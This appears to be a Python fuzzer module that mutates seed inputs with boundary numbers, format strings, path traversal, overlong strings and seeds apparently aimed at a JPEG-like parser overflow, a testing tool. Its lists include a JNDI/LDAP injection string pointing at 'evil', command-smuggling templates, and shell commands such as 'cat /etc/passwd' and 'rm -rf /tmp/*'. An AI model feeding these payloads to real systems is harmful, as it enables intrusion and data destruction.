import random
import re
import string

from .base_fuzzer import BaseFuzzer


WHITESPACE_PATTERNS = [
    " ",
    "\t",
    "\r",
    "\n",
    "\r\n",
    "    ",
    "\t\t",
    " \t ",
    "\x00",
    "\u2028",
]

NEGATIVE_NUMBERS = ["-1", "-4", "-16", "-64", "-256", "-1024", "-4096", "-999999"]

INJECTION_TEMPLATES = [
    "{0}{0}{0}",
    "${jndi:ldap://evil/{0}}",
    "<<EOF\n{0}\nEOF",
    "';{0};#",
    "`{0}`",
    "|| {0} #",
]

COMMAND_DICTIONARY = [
    "ls -la",
    "cat /etc/passwd",
    "curl http://example.com",
    "rm -rf /tmp/*",
    "id",
    "touch owned",
]

PATH_SEGMENTS = [
    "../",
    "..\\",
    "/../../../../",
    "..//..//",
]


class PlaintextFuzzer(BaseFuzzer):
    def __init__(self, example_input):
        super().__init__(example_input)
        try:
            decoded = example_input.decode("utf-8", errors="ignore")
        except Exception:
            decoded = ""
        self.original_text = decoded
        self.text = decoded.replace("\r\n", "\n").replace("\r", "\n")
        self.lines = [ln for ln in self.text.split("\n") if ln]
        token_pattern = re.compile(r"[A-Za-z0-9_\-\./]+")
        self.words = token_pattern.findall(self.text)
        self.numbers = re.findall(r"-?\d+", self.text)

    def _encode(self, text):
        if isinstance(text, bytes):
            return text
        return text.encode("utf-8", errors="ignore")

    def _random_ascii(self, min_len=1, max_len=32):
        length = random.randint(min_len, max_len)
        alphabet = string.ascii_letters + string.digits + string.punctuation
        return "".join(random.choice(alphabet) for _ in range(length))

    def _line_mutation(self):
        lines = list(self.lines) or self.text.splitlines()
        if not lines:
            return self.example_input
        mutated = lines[:]
        action = random.choice(["delete", "duplicate", "shuffle", "insert", "join"])
        if action == "delete" and mutated:
            del mutated[random.randrange(len(mutated))]
        elif action == "duplicate" and mutated:
            idx = random.randrange(len(mutated))
            mutated.insert(random.randrange(len(mutated) + 1), (mutated[idx] + "\n") * random.randint(1, 4))
        elif action == "shuffle" and len(mutated) > 1:
            random.shuffle(mutated)
        elif action == "insert":
            payload = self._random_ascii(4, 64)
            mutated.insert(random.randrange(len(mutated) + 1), payload)
        elif action == "join" and len(mutated) > 1:
            idx = random.randrange(len(mutated) - 1)
            mutated[idx] = mutated[idx] + mutated[idx + 1]
            del mutated[idx + 1]
        return self._encode("\n".join(mutated))

    def _word_mutation(self):
        words = self.words or re.findall(r"[A-Za-z0-9_]+", self.text)
        if not words:
            return self.example_input
        choice = random.choice(words)
        mutation_type = random.choice(["repeat", "flipcase", "replace", "format", "command"])
        if mutation_type == "repeat":
            mutated = choice * random.randint(2, 6)
        elif mutation_type == "flipcase":
            mutated = "".join(ch.swapcase() if ch.isalpha() else ch for ch in choice)
        elif mutation_type == "replace":
            mutated = self._random_ascii(len(choice), len(choice) + 8)
        elif mutation_type == "command":
            mutated = random.choice(COMMAND_DICTIONARY)
        else:
            mutated = choice + "%s%n%x%d%p"
        text = self.text or self.original_text
        pos = random.randint(0, len(text)) if text else 0
        return self._encode(text[:pos] + mutated + text[pos:])

    def _whitespace_mutation(self):
        text = self.text or self.original_text
        if not text:
            return self.example_input
        pattern = random.choice(WHITESPACE_PATTERNS)
        mutated = re.sub(r"\s+", pattern, text)
        if random.random() < 0.5:
            mutated = pattern * random.randint(5, 25) + mutated + pattern * random.randint(5, 25)
        return self._encode(mutated)

    def _numeric_mutation(self):
        text = self.text or self.original_text
        if not text:
            return self.example_input

        def repl(_match):
            options = [
                str(2**31 - 1),
                str(2**31),
                hex(random.randint(0, 2**32)),
                str(random.randint(0, 10**8)),
            ] + NEGATIVE_NUMBERS
            return random.choice(options)

        mutated = re.sub(r"-?\d+", repl, text, count=random.randint(1, 5))
        return self._encode(mutated)

    def _control_block(self):
        size = random.randint(8, 64)
        block = "".join(chr(random.randint(0, 31)) for _ in range(size))
        if random.random() < 0.5:
            block += "\x1b[31m"
        return self._encode(block)

    def _template_payload(self):
        template = random.choice(INJECTION_TEMPLATES)
        insertion = self._random_ascii(4, 24)
        try:
            return self._encode(template.format(insertion))
        except Exception:
            return self._encode(template + insertion)

    def _path_traversal(self):
        depth = random.randint(3, 10)
        traversal = random.choice(PATH_SEGMENTS) * depth
        filename = self._random_ascii(3, 8) + random.choice([".conf", ".log", ".ini"])
        return self._encode(traversal + filename)

    def _repeat_block(self):
        block = self.text or self.original_text
        if not block:
            block = self.example_input.decode("latin-1", errors="ignore")
        block = block.strip()
        return self._encode((block + "\n") * random.randint(5, 20))

    def _jpeg_like_overflow_seeds(self):
        pairs = [(0x0c, 0x06), (0x0b, 0x07), (0x09, 0x09), (0x10, 0x06)]
        for w, h in pairs:
            yield b"JPG" + bytes([w, h])

    def _jpeg_like_overflow_random(self):
        w = random.randint(3, 20)
        h = random.randint(3, 20)
        area = w * h
        if 71 <= area <= 110 and w not in (0x0a, 0x0d) and h not in (0x0a, 0x0d):
            return b"JPG" + bytes([w & 0xFF, h & 0xFF])
        return None

    def _dictionary_swap(self):
        text = self.text or self.original_text
        if not text:
            return self.example_input
        tokens = ["admin", "root", "user", "password", "token", "session", "flag"]
        target = random.choice(tokens)
        replacement = random.choice(tokens) + self._random_ascii(1, 4)
        mutated = text.replace(target, replacement, 1)
        return self._encode(mutated)

    def _legacy_line_boundaries(self, data):
        if not data:
            return data
        buf = bytearray(data)
        choice = random.randint(0, 2)
        if choice == 0:
            return bytes(buf).replace(b"\n", b"").replace(b"\r", b"")
        if choice == 1:
            return bytes(buf).replace(b"\n", b"\n\x00")
        positions = random.sample(range(len(buf)), min(random.randint(5, 20), len(buf)))
        for pos in sorted(positions, reverse=True):
            buf.insert(pos, ord("\n"))
        return bytes(buf)

    def _legacy_whitespace(self, data):
        if not data:
            return data
        buf = bytearray(data)
        choice = random.randint(0, 2)
        if choice == 0:
            return bytes(b for b in buf if b not in (ord(" "), ord("\t"), ord("\n"), ord("\r")))
        if choice == 1:
            prefix = b" " * random.randint(100, 1000)
            suffix = b"\t" * random.randint(100, 1000)
            return prefix + bytes(buf) + suffix
        out = bytearray()
        for b in buf:
            out.append(0 if b in (ord(" "), ord("\t")) else b)
        return bytes(out)

    def _legacy_word_boundaries(self, data):
        if not data:
            return data
        try:
            text = data.decode("utf-8", errors="ignore")
        except Exception:
            return data
        choice = random.randint(0, 2)
        if choice == 0:
            text = text.replace(" ", "").replace("\t", "").replace("\n", "")
        elif choice == 1:
            words = text.split()
            if words:
                long_word = "A" * random.choice([500, 1000, 5000, 10000])
                words.insert(random.randint(0, len(words)), long_word)
                text = " ".join(words)
        else:
            words = text.split()
            text = "\x00".join(words)
        return text.encode("utf-8", errors="ignore")

    def _insert_special_sequences(self, data):
        if not data:
            return data
        buf = bytearray(data)
        specials = [
            b"\x00",
            b"\x00" * random.randint(10, 100),
            b"\xff" * random.randint(10, 100),
            b"%s" * 10,
            b"%n" * 10,
            b"%x" * 10,
            b"A" * 10000,
            b"\x7f" * 100,
        ]
        choice = random.randint(0, 2)
        if choice == 0:
            seq = random.choice(specials)
            pos = random.randint(0, len(buf))
            buf[pos:pos] = seq
        elif choice == 1:
            buf = buf + bytearray(random.choice(specials))
        else:
            if len(buf) > 0:
                seq = random.choice(specials)
                start = random.randint(0, len(buf) - 1)
                end = min(start + len(seq), len(buf))
                buf[start:end] = seq[: end - start]
        return bytes(buf)

    def _mutate_encoding(self, data):
        if not data:
            return data
        buf = bytearray(data)
        choice = random.randint(0, 2)
        if choice == 0:
            non_printable = list(range(0, 32)) + list(range(127, 256))
            for _ in range(random.randint(5, 20)):
                pos = random.randint(0, len(buf))
                buf.insert(pos, random.choice(non_printable))
            return bytes(buf)
        if choice == 1:
            for _ in range(random.randint(5, 30)):
                if buf:
                    pos = random.randint(0, len(buf) - 1)
                    buf[pos] = random.randint(128, 255)
            return bytes(buf)
        out = bytearray()
        for i, b in enumerate(buf):
            out.append(b)
            if i % random.randint(2, 10) == 0:
                out.append(random.randint(0, 255))
        return bytes(out)

    def _create_pathological_inputs(self):
        pattern_type = random.randint(0, 7)
        if pattern_type == 0:
            return b"A" * random.choice([1000, 5000, 10000, 50000])
        if pattern_type == 1:
            pattern = random.choice([b"AB", b"XYZ", b"0123", b"\x00\xff"])
            return pattern * random.choice([500, 1000, 5000])
        if pattern_type == 2:
            return b"\x00" * random.choice([100, 500, 1000])
        if pattern_type == 3:
            return b"\xff" * random.choice([100, 500, 1000])
        if pattern_type == 4:
            return b"%s%n%x%p%d" * random.choice([10, 50, 100])
        if pattern_type == 5:
            nums = []
            for _ in range(random.randint(1, 10)):
                nums.append(
                    random.choice(
                        [
                            b"0",
                            b"-1",
                            b"2147483647",
                            b"-2147483648",
                            b"4294967295",
                            b"9223372036854775807",
                            b"-9223372036854775808",
                            b"18446744073709551615",
                            b"999999999999999999999999999999",
                        ]
                    )
                )
            return b"\n".join(nums) + b"\n"
        if pattern_type == 6:
            text = random.choice([b"trivial", b"test", b"admin", b"root"])
            for _ in range(random.randint(1, 5)):
                text += bytes([random.randint(0, 31)])
            return text + b"\n"
        size = random.choice([100, 500, 1000])
        return random.randbytes(size)

    def _mutate_length(self, data):
        if not data:
            return data
        choice = random.randint(0, 2)
        if choice == 0 and len(data) > 1:
            new_len = random.choice(
                [1, 2, 4, 8, 16, 32, 64, 128, 256, len(data) // 2, len(data) - 1]
            )
            return data[: min(new_len, len(data))]
        if choice == 1:
            return data * random.choice([8, 16, 32, 64, 128])
        padding_size = random.choice([10000, 100000])
        padding_byte = random.choice([0, 0x41, 0xFF])
        return data + bytes([padding_byte] * padding_size)

    def _mutate_numbers(self, data):
        if not data:
            return data
        try:
            text = data.decode("utf-8", errors="ignore")
        except Exception:
            return data
        choice = random.randint(0, 3)
        if choice == 0:
            boundary = [
                "0",
                "-1",
                "2147483647",
                "-2147483648",
                "4294967295",
                "9223372036854775807",
                "-9223372036854775808",
                "18446744073709551615",
                "999999999999999999999999",
            ]
            return re.sub(r"\d+", lambda _m: random.choice(boundary), text).encode("utf-8", errors="ignore")
        if choice == 1:
            return re.sub(r"\b(\d+)\b", lambda m: "-" + m.group(1), text).encode("utf-8", errors="ignore")
        if choice == 2:
            return re.sub(r"\d+", "%d%n%s%x", text).encode("utf-8", errors="ignore")
        lines = text.split("\n")
        lines.insert(random.randint(0, len(lines)), str(2**63))
        return "\n".join(lines).encode("utf-8", errors="ignore")

    def _mutate_structured_fields(self, data):
        if not data:
            return data
        try:
            text = data.decode("utf-8", errors="ignore")
        except Exception:
            return data
        lines = text.split("\n")
        if len(lines) < 2:
            return data
        m = random.randint(0, 9)
        if m == 0:
            for i in range(len(lines)):
                if re.match(r"^\s*-?\d+\s*$", lines[i]):
                    lines[i] = random.choice(
                        [
                            "0",
                            "-1",
                            "2147483647",
                            "-2147483648",
                            "4294967295",
                            "9223372036854775807",
                            "-9223372036854775808",
                            "18446744073709551615",
                            "999999999999999999999999",
                        ]
                    )
            return "\n".join(lines).encode("utf-8", errors="ignore")
        if m == 1 and len(lines) > 1 and lines[-1].strip():
            if re.match(r"^\s*-?\d+\s*$", lines[-1]):
                lines[-1] = random.choice(["0", "-1", "2147483647", "-2147483648", "4294967295", "-9223372036854775808"])
            return "\n".join(lines).encode("utf-8", errors="ignore")
        if m == 2 and len(lines) > 1:
            if re.match(r"^\s*-?\d+\s*$", lines[1]):
                lines[1] = random.choice(["0", "-1", "2147483647", "-2147483648", "4294967295", "-9223372036854775808", "999999999999999999999999"])
            return "\n".join(lines).encode("utf-8", errors="ignore")
        if m == 3 and len(lines) > 1:
            for i in range(1, len(lines)):
                if re.match(r"^\s*-?\d+\s*$", lines[i]):
                    lines[i] = random.choice(
                        [
                            str(random.randint(-2147483648, 2147483647)),
                            "2147483647",
                            "-2147483648",
                            "0",
                            "-1",
                            "4294967295",
                            "-9223372036854775808",
                        ]
                    )
            return "\n".join(lines).encode("utf-8", errors="ignore")
        if m == 4:
            lines.append(random.choice(["0", "-1", "2147483647", "-2147483648", "4294967295", "999999999999999999"]))
            return "\n".join(lines).encode("utf-8", errors="ignore")
        if m == 5:
            for i in range(len(lines)):
                if re.match(r"^\s*-?\d+\s*$", lines[i]):
                    num = int(lines[i].strip())
                    lines[i] = str(random.choice([num + 1, num - 1, num * 2, num * -1, -2147483648, 2147483647, 0]))
            return "\n".join(lines).encode("utf-8", errors="ignore")
        if m == 6:
            for i in range(len(lines)):
                if re.match(r"^\s*-?\d+\s*$", lines[i]):
                    lines[i] = random.choice(["-2147483649", "2147483648", "-9223372036854775809", "9223372036854775808"])
            return "\n".join(lines).encode("utf-8", errors="ignore")
        if m == 7:
            for i in range(len(lines)):
                if not re.match(r"^\s*-?\d+\s*$", lines[i]) and lines[i].strip():
                    if random.random() < 0.5:
                        lines[i] = "A" * random.choice([100, 500, 1000, 5000])
            return "\n".join(lines).encode("utf-8", errors="ignore")
        if m == 8:
            for i in range(len(lines)):
                if re.match(r"^\s*-?\d+\s*$", lines[i]):
                    lines[i] = random.choice(["%d", "%s", "%n", "%x", "%p"])
            return "\n".join(lines).encode("utf-8", errors="ignore")
        for i in range(len(lines)):
            if re.match(r"^\s*-?\d+\s*$", lines[i]):
                num = abs(int(lines[i].strip()))
                lines[i] = str(-num)
        return "\n".join(lines).encode("utf-8", errors="ignore")

    def generate(self):
        yield b""
        yield self.example_input
        for seed in self._jpeg_like_overflow_seeds():
            yield seed
        # a few random JPG seeds to hit area*6 overflow quickly
        for _ in range(16):
            s = self._jpeg_like_overflow_random()
            if s:
                yield s
        yield self._repeat_block()
        yield self._encode(self.text.upper() if self.text else "")
        yield self._encode(self.text.lower() if self.text else "")
        for neg in NEGATIVE_NUMBERS:
            if self.text:
                candidate = re.sub(r"-?\d+", neg, self.text, count=1)
                if candidate and candidate != self.text:
                    yield self._encode(candidate)
        for tmpl in (self._path_traversal, self._template_payload):
            yield tmpl()
        for _ in range(30):
            yield self._mutate_structured_fields(self.example_input)
        for _ in range(20):
            yield self._mutate_numbers(self.example_input)
        for _ in range(15):
            yield self._create_pathological_inputs()
        for _ in range(10):
            yield self._mutate_length(self.example_input)
        for _ in range(10):
            yield self._insert_special_sequences(self.example_input)
        for _ in range(10):
            yield self._mutate_encoding(self.example_input)
        for _ in range(5):
            yield self._legacy_line_boundaries(self.example_input)
        for _ in range(5):
            yield self._legacy_whitespace(self.example_input)
        for _ in range(5):
            yield self._legacy_word_boundaries(self.example_input)
        base_strategies = [
            lambda: self.mutate_bytes(self.example_input),
            self._line_mutation,
            self._word_mutation,
            self._whitespace_mutation,
            self._numeric_mutation,
            self._control_block,
            self._template_payload,
            self._path_traversal,
            self._repeat_block,
            self._dictionary_swap,
        ]
        combo_strategies = base_strategies + [
            lambda: self._mutate_structured_fields(self.example_input),
            lambda: self._mutate_numbers(self.example_input),
            lambda: self._mutate_length(self.example_input),
            lambda: self._insert_special_sequences(self.example_input),
            lambda: self._mutate_encoding(self.example_input),
        ]
        while True:
            strategy = random.choice(combo_strategies)
            try:
                yield strategy()
            except Exception:
                yield self.mutate_bytes(self.example_input)
